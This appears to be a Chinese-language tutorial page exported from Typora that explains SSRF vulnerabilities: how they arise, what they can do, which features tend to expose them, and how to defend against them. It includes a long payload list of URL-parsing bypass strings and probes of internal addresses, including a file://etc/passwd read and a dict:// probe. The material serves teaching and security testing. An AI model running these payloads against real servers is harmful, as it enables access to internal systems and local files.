<!doctype html>
<html>
<head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>
<link rel='stylesheet' href='../../../plugins/googleapis/fonts.css'>
<link rel="stylesheet" href="../../../dist/css/markdown.css">
</head>
<body class='typora-export os-windows'><div class='typora-export-content'>
<div id='write'  class=''><ul><li><p><strong><span>SSRF漏洞介绍</span></strong></p><p><span>SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种由攻击者构造请求，利用服务器端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务器端发起的，所以服务器能请求到与自身相连而外网隔离的内部系统）。</span></p></li></ul><p></br></p><ul><li><p><strong><span>SSRF漏洞原理</span></strong></p><p><span>SSRF漏洞的形成大多是由于服务端提供了从其他服务器应用发起请求获取数据的功能，但没有对目标地址做过滤与限制。攻击者在访问Web服务器（A）的特定功能时，构造恶意payload致使由A发起对内部网络中系统B（内网隔离，外部不可访问）的请求，从而获取敏感信息。此时A被作为中间人（跳板）进行利用。</span></p><p><span>简而言之：SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</span></p></li></ul><p></br></p><ul><li><p><strong><span>SSRF漏洞危害（利用方式）</span></strong></p><ol><li><p><span>对外网及服务器所在内网进行端口扫描（逐个试探），获取一些服务的banner信息。</span></p></li><li><p><span>攻击运行在内网或本地的应用程序。</span></p></li><li><p><span>对内网Web应用进行指纹识别，识别企业内部的资产信息，通过访问默认文件实现（如：readme文件）。</span></p></li><li><p><span>攻击内、外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如strust2、SQL注入等)。</span></p></li><li><p><span>下载内网资源，利用file协议读取本地文件或资源等。</span></p></li><li><p><span>内部任意主机的任意端口发送精心构造的Payload。</span></p></li><li><p><span>DOS攻击（请求大文件，始终保持连接Keep-Alive Always）。</span></p></li><li><p><span>进行跳板。</span></p></li><li><p><span>利用Redis未授权访问，HTTP CRLF注入等实现GetShell。</span></p></li></ol></li></ul><p></br></p><ul><li><p><strong><span>SSRF常见攻击点（测试点）</span></strong></p><ol><li><p><span>社交分享功能：获取超链接的标题等内容进行显示。</span></p></li></ol><ol start='2' ><li><p><span>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览。</span></p></li></ol><ol start='3' ><li><p><span>在线翻译：给网址翻译对应网页的内容。</span></p></li></ol><ol start='4' ><li><p><span>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片。</span></p></li></ol><ol start='5' ><li><p><span>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验。</span></p></li></ol><ol start='6' ><li><p><span>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行SSRF测试。</span></p></li></ol><ol start='7' ><li><p><span>网站采集，网站抓取的地方：一些网站会针对你输入的URL进行一些信息采集工作。</span></p></li></ol><ol start='8' ><li><p><span>数据库内置功能：数据库的比如mongodb的copyDatabase函数。</span></p></li></ol><ol start='9' ><li><p><span>邮件系统：比如接收邮件服务器地址。</span></p></li></ol><ol start='10' ><li><p><span>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等。</span></p></li></ol><ol start='11' ><li><p><span>未公开的api实现以及其他扩展调用URL的功能，可以利用google 语法加上这些关键字去寻找SSRF漏洞。一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</span></p></li></ol></li></ul><p></br></p><ul><li><p><strong><span>SSRF测试常用Payload及简单绕过手法</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="http" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="http"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre>x</pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">https://pilot-fanqie.com</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">http:</span><span class="cm-string">//pilot-fanqie.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">http:</span><span class="cm-string">//www.example.com.pilot-fanqie.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">https:</span><span class="cm-string">//www.example.com.pilot-fanqie.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">http:</span><span class="cm-string">//pilot-fanqie.com/www.example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">https:</span><span class="cm-string">//pilot-fanqie.com/www.example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">http:</span><span class="cm-string">//www.example.com?url=http://pilot-fanqie.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">https:</span><span class="cm-string">//www.example.com?url=https://pilot-fanqie.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">/pilot-fanqie.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">//pilot-fanqie.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">///pilot-fanqie.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">////pilot-fanqie.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">///pilot-fanqie.com//..</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">////pilot-fanqie.com//..</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">http:</span><span class="cm-string">//www.example.com@www.pilot-fanqie.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">https:</span><span class="cm-string">//www.example.com@www.pilot-fanqie.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">http:</span><span class="cm-string">//www.pilot-fanqie.com\www.example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">https:</span><span class="cm-string">//www.pilot-fanqie.com\www.example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">http:</span><span class="cm-string">//www.pilot-fanqie.com#www.example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">https:</span><span class="cm-string">//www.pilot-fanqie.com#www.example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">http:</span><span class="cm-string">//www.pilot-fanqie.com?www.example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">https:</span><span class="cm-string">//www.pilot-fanqie.com?www.example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">http:</span><span class="cm-string">//www.pilot-fanqie.com\\www.example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">https:</span><span class="cm-string">//www.pilot-fanqie.com\\www.example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">.pilot-fanqie.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">.baidu</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">127.0.0.1</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">127.0.0.1:</span><span class="cm-string">80</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">http:</span><span class="cm-string">//localhost</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">https:</span><span class="cm-string">//localhost</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">0x7f.0.0.1</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">0</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">0.0.0.0</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">dict:</span><span class="cm-string">//127.0.0.1:80</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">file:</span><span class="cm-string">//etc/passwd</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">//example.com@google.com/%2f..</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">///google.com/%2f..</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">///example.com@google.com/%2f..</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">////google.com/%2f..</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">https:</span><span class="cm-string">//google.com/%2f..</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">https:</span><span class="cm-string">//example.com@google.com/%2f..</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">/https:</span><span class="cm-string">//google.com/%2f..</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">/https:</span><span class="cm-string">//example.com@google.com/%2f..</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">//google.com/%2f%2e%2e</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">//example.com@google.com/%2f%2e%2e</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">///google.com/%2f%2e%2e</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">///example.com@google.com/%2f%2e%2e</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">////google.com/%2f%2e%2e</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">/http:</span><span class="cm-string">//example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">/http:</span><span class="cm-string">/example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">/https:</span><span class="cm-string">/%5cexample.com/</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">/https:</span><span class="cm-string">//%09/example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">/https:</span><span class="cm-string">//%5cexample.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">/https:</span><span class="cm-string">///example.com/%2e%2e</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">/https:</span><span class="cm-string">///example.com/%2f%2e%2e</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">/https:</span><span class="cm-string">//example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">/https:</span><span class="cm-string">//example.com/</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">/https:</span><span class="cm-string">//example.com/%2e%2e</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">/https:</span><span class="cm-string">//example.com/%2e%2e%2f</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">/https:</span><span class="cm-string">//example.com/%2f%2e%2e</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">/https:</span><span class="cm-string">//example.com/%2f..</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">/https:</span><span class="cm-string">//example.com//</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">/https:</span><span class="cm-string">example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">/%09/example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">/%2f%2fexample.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">/%5cexample.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">/.example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">//%09/example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">//%5cexample.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">///%09/example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">///%5cexample.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">////%09/example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">////%5cexample.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">/////example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">/////example.com/</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">////\;@example.com</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">////example.com/</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 1819px;"></div><div class="CodeMirror-gutters" style="display: none; height: 1819px;"></div></div></div></pre></li></ul><p></br></p><ul><li><p><strong><span>SSRF进阶知识</span></strong></p><ol><li><p><span>DNS Rebinding：</span><a href='https://zhuanlan.zhihu.com/p/572743280' target="_blank"><span>知乎-Web-SSRF-DNS重绑定</span></a></p></li><li><p><span>Gopher攻击Redis：</span><a href='https://www.51cto.com/article/721287.html' target="_blank"><span>Gopher协议在SSRF中的应用</span></a></p></li></ol><ol start='3' ><li><p><span>……</span></p></li></ol></li></ul><p></br></p><ul><li><p><strong><span>SSRF的防御</span></strong></p><p><span>SSRF的防御比较复杂，需要根据业务实际场景来采取不同的方案，不同的代码有不同的修补策略。常规的修复方案如下：</span></p><ol><li><p><span>限制协议为HTTP、HTTPS,禁用不需要的协议可以防止类似于file://, gopher://, ftp:// 等引起的问题。</span></p></li><li><p><span>禁止30x跳转。</span></p></li><li><p><span>设置URL白名单或者限制内网IP。</span></p></li><li><p><span>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</span></p></li><li><p><span>限制请求的端口为http常用的端口，比如 80、443、8080、8090。</span></p></li><li><p><span>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</span></p></li></ol></li></ul><p></br></p><ul><li><p><strong><span>推荐学习文章</span></strong></p><ol><li><p><a href='https://blog.csdn.net/qq_48904485/article/details/123653514' target="_blank"><span>CSDN-SSRF漏洞详解</span></a></p></li><li><p><a href='https://security.tencent.com/index.php/blog/msg/179' target="_blank"><span>腾讯安全-SSRF安全指北</span></a></p></li><li><p><a href='https://zhuanlan.zhihu.com/p/595950524' target="_blank"><span>知乎-Web安全实践：SSRF</span></a></p></li><li><p><a href='https://gitcode.csdn.net/65ec50e31a836825ed79815a.html' target="_blank"><span>漏洞原理——ssrf</span></a></p></li></ol></li></ul></div></div>
</body>
</html>